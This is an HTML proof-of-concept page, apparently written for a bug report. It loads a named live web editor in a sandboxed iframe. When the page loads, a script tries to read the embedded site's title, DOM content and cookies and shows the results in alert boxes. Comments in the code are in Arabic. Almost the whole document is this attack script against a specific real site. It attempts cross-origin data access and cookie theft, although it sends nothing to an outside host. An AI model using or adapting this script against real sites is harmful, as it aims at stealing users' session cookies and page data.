<!DOCTYPE html>
<html>
<head>
  <title>Iframe PoC Exploit</title>
</head>
<body>
  <h1>🔥 Exploit PoC</h1>

  <iframe id="victimFrame"
    src="https://tb.toloka.dev/editor" 
    style="width: 100%; height: 400px;" 
    onload="tryExploit()" 
    sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
  </iframe>

  <script>
    function tryExploit() {
      try {
        const iframe = document.getElementById('victimFrame');
        const victimWindow = iframe.contentWindow;

        // محاولة قراءة العنوان
        const title = victimWindow.document.title;
        alert("Parent can read iframe title: " + title);

        // محاولة الوصول إلى عناصر DOM داخل iframe
        const h1 = victimWindow.document.querySelector('h1');
        if (h1) {
          alert("Found h1 in iframe: " + h1.textContent);
        }

        // قراءة الكوكيز الخاصة بالموقع الضحية (إن توفرت)
        const cookies = victimWindow.document.cookie;
        alert("Iframe cookies: " + cookies);

      } catch (e) {
        alert("❌ Exploit failed: " + e.message);
      }
    }
  </script>
</body>
</html>
